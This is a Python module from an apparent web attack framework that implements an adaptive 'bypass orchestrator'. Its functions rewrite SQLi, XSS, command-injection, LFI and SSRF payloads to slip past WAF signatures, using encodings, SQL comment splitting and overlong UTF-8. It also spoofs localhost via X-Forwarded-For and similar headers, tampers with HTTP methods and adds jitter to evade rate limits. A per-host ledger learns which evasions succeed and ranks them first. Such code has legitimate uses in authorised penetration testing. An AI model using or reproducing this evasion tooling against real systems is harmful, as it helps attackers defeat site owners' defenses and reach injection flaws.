#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK
Universal Bypass Orchestrator

Centralises every bypass technique the framework supports — payload
encoding, case rotation, comment splitting, header smuggling, origin
spoofing, verb tampering, path normalization, and rate-limit evasion —
behind a single ladder API.

Modules and the requester ask the orchestrator for a list of *attempts*
in priority order; each rung escalates the bypass aggressiveness. The
orchestrator learns per-host which rungs succeed (response not blocked /
not 4xx-WAF) and re-orders future attempts so successful techniques are
tried first. This is what turns the framework into a *full bypasser*
rather than a fixed set of static encodings.

Design choices:
- Pure stdlib. No requests/yaml/etc. imports so the module is fully
  unit-testable from the sandbox.
- Stateless rungs: each rung is a callable ``(payload, ctx) -> (mutated_payload,
  extra_headers, http_method_override, url_override)``. ``None`` for any
  field means "leave unchanged".
- The orchestrator owns the success/failure ledger; rungs are pure.

Wiring:
- ``utils.requester.Requester`` checks ``engine.bypass`` (set by the
  engine when ``config['full_bypass']`` is on or when ``waf_bypass`` is
  on) and feeds every outgoing request through ``orchestrator.apply()``.
- Modules call ``orchestrator.payload_variants(payload, family)`` to get
  ranked payload mutations, replacing per-module hand-rolled lists.
"""

from __future__ import annotations

import logging
import random
import re
import threading
import unicodedata
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Public dataclasses
# ---------------------------------------------------------------------------


@dataclass
class BypassAttempt:
    """A single attempt the orchestrator wants the caller to try.

    All fields are optional overlays on top of the original request.  A
    ``None`` value means the caller should keep the original.
    """

    rung: str
    payload: Optional[str] = None
    extra_headers: Dict[str, str] = field(default_factory=dict)
    method_override: Optional[str] = None
    url_override: Optional[str] = None
    delay_seconds: float = 0.0

    def merge_into(self, base: dict) -> dict:
        """Return a copy of ``base`` with this attempt's overlays applied."""
        out = dict(base)
        if self.payload is not None:
            out["payload"] = self.payload
        if self.method_override:
            out["method"] = self.method_override
        if self.url_override:
            out["url"] = self.url_override
        if self.extra_headers:
            headers = dict(base.get("headers") or {})
            headers.update(self.extra_headers)
            out["headers"] = headers
        return out


# ---------------------------------------------------------------------------
# Rung registry
# ---------------------------------------------------------------------------


def _rung_baseline(payload: str, ctx: dict) -> BypassAttempt:
    return BypassAttempt(rung="baseline", payload=payload)


def _rung_url_encode(payload: str, ctx: dict) -> BypassAttempt:
    return BypassAttempt(rung="url_encode", payload=quote(payload, safe=""))


def _rung_double_url_encode(payload: str, ctx: dict) -> BypassAttempt:
    return BypassAttempt(rung="double_url_encode", payload=quote(quote(payload, safe=""), safe=""))


def _rung_unicode_escape(payload: str, ctx: dict) -> BypassAttempt:
    encoded = "".join(f"\\u{ord(c):04x}" if ord(c) < 128 else c for c in payload)
    return BypassAttempt(rung="unicode_escape", payload=encoded)


def _rung_unicode_normalize(payload: str, ctx: dict) -> BypassAttempt:
    # NFKC frequently collapses fullwidth/decomposed forms into the same
    # ASCII bytes the WAF rule was looking for, but only after we've
    # smuggled past a normaliser that ran *before* the rule.
    return BypassAttempt(rung="unicode_normalize_nfkd", payload=unicodedata.normalize("NFKD", payload))


def _rung_html_entities(payload: str, ctx: dict) -> BypassAttempt:
    out = "".join(f"&#{ord(c)};" for c in payload)
    return BypassAttempt(rung="html_entities", payload=out)


def _rung_mixed_case(payload: str, ctx: dict) -> BypassAttempt:
    # Mixed case bypasses naive case-sensitive WAF signatures
    out = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    return BypassAttempt(rung="mixed_case", payload=out)


def _rung_whitespace_swap(payload: str, ctx: dict) -> BypassAttempt:
    # Tab is the most reliable WAF-bypass whitespace; \v breaks more parsers
    return BypassAttempt(rung="whitespace_tab", payload=payload.replace(" ", "\t"))


def _rung_sql_inline_comment(payload: str, ctx: dict) -> BypassAttempt:
    # /**/ between SQL keywords splits naive token-based filters
    keywords = ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE", "AND", "OR", "DROP", "ORDER", "BY")
    out = payload
    for kw in keywords:
        out = re.sub(re.escape(kw), kw[:2] + "/**/" + kw[2:], out, flags=re.IGNORECASE)
    return BypassAttempt(rung="sql_inline_comment", payload=out)


def _rung_sql_versioned_comment(payload: str, ctx: dict) -> BypassAttempt:
    # MySQL conditional-comment trick: /*!50000UNION*/ executes only for MySQL 5+
    keywords = ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE", "AND", "OR", "DROP")
    out = payload
    for kw in keywords:
        out = re.sub(re.escape(kw), f"/*!50000{kw}*/", out, flags=re.IGNORECASE)
    return BypassAttempt(rung="sql_versioned_comment", payload=out)


def _rung_overlong_utf8(payload: str, ctx: dict) -> BypassAttempt:
    # Overlong UTF-8 sequences for the common attack chars; many WAFs
    # decode the request before signature matching, but some legacy ones
    # don't, so the rule never sees the dangerous byte.
    overlong = {"<": "%c0%bc", ">": "%c0%be", "'": "%c0%a7", '"': "%c0%a2", "/": "%c0%af", " ": "%c0%a0"}
    out = "".join(overlong.get(c, c) for c in payload)
    return BypassAttempt(rung="overlong_utf8", payload=out)


def _rung_x_forwarded_for_localhost(payload: str, ctx: dict) -> BypassAttempt:
    # The ipv4 + ipv6 + private-range trio defeats simple "trust 127.*" checks
    return BypassAttempt(
        rung="ip_spoof_xff",
        payload=payload,
        extra_headers={
            "X-Forwarded-For": "127.0.0.1, 10.0.0.1, ::1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Host": "localhost",
            "X-Forwarded-Host": "localhost",
        },
    )


def _rung_origin_spoof(payload: str, ctx: dict) -> BypassAttempt:
    host = ctx.get("host") or "localhost"
    return BypassAttempt(
        rung="origin_spoof",
        payload=payload,
        extra_headers={
            "Origin": f"https://{host}",
            "Referer": f"https://{host}/",
        },
    )


def _rung_method_override(payload: str, ctx: dict) -> BypassAttempt:
    # Some apps treat POST as authoritative but evaluate filtering only on
    # the surface verb. X-HTTP-Method-Override flips that on its head.
    return BypassAttempt(
        rung="method_override",
        payload=payload,
        extra_headers={"X-HTTP-Method-Override": "POST", "X-Method-Override": "POST"},
    )


def _rung_path_traversal_doubledot(payload: str, ctx: dict) -> BypassAttempt:
    # Doesn't change the payload but signals to LFI-style modules to mix
    # %2e%2e/ and ....// in their probes.
    return BypassAttempt(rung="path_doubledot", payload=payload.replace("../", "....//"))


def _rung_jitter_delay(payload: str, ctx: dict) -> BypassAttempt:
    # Inject 0.4–1.6 s jitter to defeat "N requests / second" rate-limit
    # detectors that work on burst-detect rather than sliding window.
    return BypassAttempt(rung="jitter_delay", payload=payload, delay_seconds=random.uniform(0.4, 1.6))


# Ordered ladder. Earlier rungs are cheaper / less suspicious; later
# rungs are more aggressive. The orchestrator tries them in this order
# *until* a per-host learning ledger says otherwise.
DEFAULT_LADDER: List[Tuple[str, Callable[[str, dict], BypassAttempt]]] = [
    ("baseline", _rung_baseline),
    ("url_encode", _rung_url_encode),
    ("mixed_case", _rung_mixed_case),
    ("whitespace_tab", _rung_whitespace_swap),
    ("double_url_encode", _rung_double_url_encode),
    ("html_entities", _rung_html_entities),
    ("unicode_escape", _rung_unicode_escape),
    ("unicode_normalize_nfkd", _rung_unicode_normalize),
    ("sql_inline_comment", _rung_sql_inline_comment),
    ("sql_versioned_comment", _rung_sql_versioned_comment),
    ("overlong_utf8", _rung_overlong_utf8),
    ("ip_spoof_xff", _rung_x_forwarded_for_localhost),
    ("origin_spoof", _rung_origin_spoof),
    ("method_override", _rung_method_override),
    ("path_doubledot", _rung_path_traversal_doubledot),
    ("jitter_delay", _rung_jitter_delay),
]

# Family-specific shortlists. We don't run SQL-comment rungs for a
# command-injection payload; instead the orchestrator skips inapplicable
# rungs entirely. Rungs not listed for a family fall back to DEFAULT.
FAMILY_LADDERS: Dict[str, List[str]] = {
    "sqli": [
        "baseline",
        "sql_inline_comment",
        "sql_versioned_comment",
        "mixed_case",
        "whitespace_tab",
        "url_encode",
        "double_url_encode",
        "unicode_normalize_nfkd",
        "ip_spoof_xff",
        "method_override",
    ],
    "xss": [
        "baseline",
        "mixed_case",
        "html_entities",
        "unicode_escape",
        "url_encode",
        "double_url_encode",
        "overlong_utf8",
        "origin_spoof",
    ],
    "cmdi": [
        "baseline",
        "url_encode",
        "double_url_encode",
        "whitespace_tab",
        "ip_spoof_xff",
        "jitter_delay",
    ],
    "lfi": [
        "baseline",
        "url_encode",
        "double_url_encode",
        "path_doubledot",
        "overlong_utf8",
        "unicode_normalize_nfkd",
    ],
    "ssrf": [
        "baseline",
        "ip_spoof_xff",
        "origin_spoof",
        "url_encode",
        "double_url_encode",
        "overlong_utf8",
    ],
    "ssti": [
        "baseline",
        "url_encode",
        "html_entities",
        "unicode_escape",
        "mixed_case",
    ],
    "auth": [
        "baseline",
        "ip_spoof_xff",
        "origin_spoof",
        "method_override",
    ],
    "rate_limit": [
        "baseline",
        "ip_spoof_xff",
        "jitter_delay",
        "method_override",
    ],
}


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------


class BypassOrchestrator:
    """Adaptive ladder of bypass techniques with per-host learning.

    Thread-safe: the ledger is guarded by a lock so parallel module
    workers don't race each other.

    Args:
        max_attempts: hard cap on attempts per ``payload_variants()``
            call. Default 8 keeps scan time bounded; ``--full-bypass``
            raises this to ``len(DEFAULT_LADDER)``.
        seed: optional random seed for deterministic tests.
    """

    def __init__(self, max_attempts: int = 8, seed: Optional[int] = None):
        self.max_attempts = max_attempts
        self._rung_lookup: Dict[str, Callable[[str, dict], BypassAttempt]] = {
            name: fn for name, fn in DEFAULT_LADDER
        }
        # ledger[host][rung] -> {"success": int, "fail": int}
        self._ledger: Dict[str, Dict[str, Dict[str, int]]] = {}
        self._lock = threading.RLock()
        if seed is not None:
            random.seed(seed)

    # ------------------------------------------------------------------ ladder
    def ladder_for(self, family: Optional[str]) -> List[str]:
        """Return the rung names appropriate for *family*.

        Falls back to the full default ladder when *family* is unknown
        so callers always get something useful.
        """
        if not family:
            return [name for name, _ in DEFAULT_LADDER]
        return FAMILY_LADDERS.get(family.lower(), [name for name, _ in DEFAULT_LADDER])

    # ------------------------------------------------------------- payloads
    def payload_variants(
        self,
        payload: str,
        family: Optional[str] = None,
        host: Optional[str] = None,
        ctx: Optional[dict] = None,
    ) -> List[BypassAttempt]:
        """Build a ranked list of :class:`BypassAttempt` for *payload*.

        Args:
            payload:  the original payload string.
            family:   vulnerability family (``sqli``, ``xss``, …); used
                to pick the right ladder.
            host:     hostname; used to query the learning ledger.
            ctx:      arbitrary context (``url``, ``method``…) the rung
                callables may inspect.
        """
        ctx = dict(ctx or {})
        if host and "host" not in ctx:
            ctx["host"] = host

        rung_names = self.ladder_for(family)
        ranked = self._rank_rungs(rung_names, host)

        attempts: List[BypassAttempt] = []
        seen_payloads: set = set()
        for name in ranked:
            fn = self._rung_lookup.get(name)
            if not fn:
                continue
            try:
                attempt = fn(payload, ctx)
            except Exception as exc:  # pragma: no cover — defensive
                logger.debug("Rung %s raised %s", name, exc)
                continue
            # de-dup payload-only rungs so a no-op encoding (URL-encode of
            # ASCII letters) doesn't waste a slot
            key = (attempt.payload, tuple(sorted((attempt.extra_headers or {}).items())))
            if key in seen_payloads and not attempt.delay_seconds and not attempt.method_override:
                continue
            seen_payloads.add(key)
            attempts.append(attempt)
            if len(attempts) >= self.max_attempts:
                break
        return attempts

    # ------------------------------------------------------------ request hook
    def apply(self, request: dict, family: Optional[str] = None) -> dict:
        """Apply a single best-effort bypass overlay to a request dict.

        Used by ``utils.requester.Requester`` to add headers and (when
        learning says it pays off) jitter or method-override on every
        outgoing scan request, without changing the payload itself.

        ``request`` keys: ``url``, ``method``, ``headers`` (optional dict),
        ``data`` (optional). The returned dict is a shallow copy with
        any ``Bypass`` adjustments merged in.
        """
        host = self._extract_host(request.get("url"))
        ladder = self.ladder_for(family or "rate_limit")
        # Pick the single highest-success rung that *only* mutates
        # headers / method / delay — never the payload, because the
        # caller-supplied request body is already finalised.
        ranked = self._rank_rungs(ladder, host)
        out = dict(request)
        for name in ranked:
            fn = self._rung_lookup.get(name)
            if not fn:
                continue
            attempt = fn("", {"host": host or ""})
            if attempt.payload not in (None, ""):
                # this rung mutates the payload; not safe at this layer
                continue
            if attempt.extra_headers:
                headers = dict(out.get("headers") or {})
                # Don't overwrite caller-set headers
                for k, v in attempt.extra_headers.items():
                    headers.setdefault(k, v)
                out["headers"] = headers
            if attempt.method_override and out.get("method", "GET").upper() == "GET":
                # Method-override is only meaningful when we're already
                # using a GET; flipping a POST to GET would mangle the body.
                pass  # leave as-is to preserve semantic correctness
            if attempt.delay_seconds:
                # Jitter is best handled by the caller's rate-limit hook;
                # signal via a private key so it doesn't end up in the wire.
                out["_bypass_delay"] = max(out.get("_bypass_delay", 0.0), attempt.delay_seconds)
        return out

    # --------------------------------------------------------------- learning
    def record_success(self, host: Optional[str], rung: str) -> None:
        """Mark *rung* as successful for *host* (response not WAF-blocked)."""
        if not host or not rung:
            return
        with self._lock:
            self._ledger.setdefault(host, {}).setdefault(rung, {"success": 0, "fail": 0})
            self._ledger[host][rung]["success"] += 1

    def record_failure(self, host: Optional[str], rung: str) -> None:
        if not host or not rung:
            return
        with self._lock:
            self._ledger.setdefault(host, {}).setdefault(rung, {"success": 0, "fail": 0})
            self._ledger[host][rung]["fail"] += 1

    def stats(self, host: Optional[str] = None) -> dict:
        """Return the current ledger; useful for the dashboard."""
        with self._lock:
            if host:
                return dict(self._ledger.get(host, {}))
            return {h: dict(rungs) for h, rungs in self._ledger.items()}

    # ----------------------------------------------------------- internal
    def _rank_rungs(self, rung_names: List[str], host: Optional[str]) -> List[str]:
        """Reorder *rung_names* by per-host success rate, preserving order
        among rungs we have no data for."""
        if not host:
            return list(rung_names)
        with self._lock:
            host_stats = self._ledger.get(host, {})
        if not host_stats:
            return list(rung_names)

        def score(name: str) -> Tuple[int, float]:
            rec = host_stats.get(name)
            if not rec:
                return (0, 0.0)
            total = rec["success"] + rec["fail"]
            if total == 0:
                return (0, 0.0)
            return (1, rec["success"] / total)

        # Stable sort: rungs with data come first, ordered by success
        # rate; rungs without data keep their original ladder order.
        return sorted(rung_names, key=lambda n: (-score(n)[0], -score(n)[1]))

    @staticmethod
    def _extract_host(url: Optional[str]) -> Optional[str]:
        if not url:
            return None
        try:
            parsed = urlparse(url)
            return parsed.hostname
        except Exception:
            return None


# ---------------------------------------------------------------------------
# Convenience module-level factory used by the engine
# ---------------------------------------------------------------------------


def build_orchestrator(config: Optional[dict] = None) -> BypassOrchestrator:
    """Construct an orchestrator with config-aware defaults.

    ``config['full_bypass']`` raises ``max_attempts`` to the full ladder
    length; otherwise we cap at 8 to keep scan time bounded.
    """
    config = config or {}
    if config.get("full_bypass") or config.get("waf_bypass"):
        return BypassOrchestrator(max_attempts=len(DEFAULT_LADDER))
    return BypassOrchestrator(max_attempts=8)
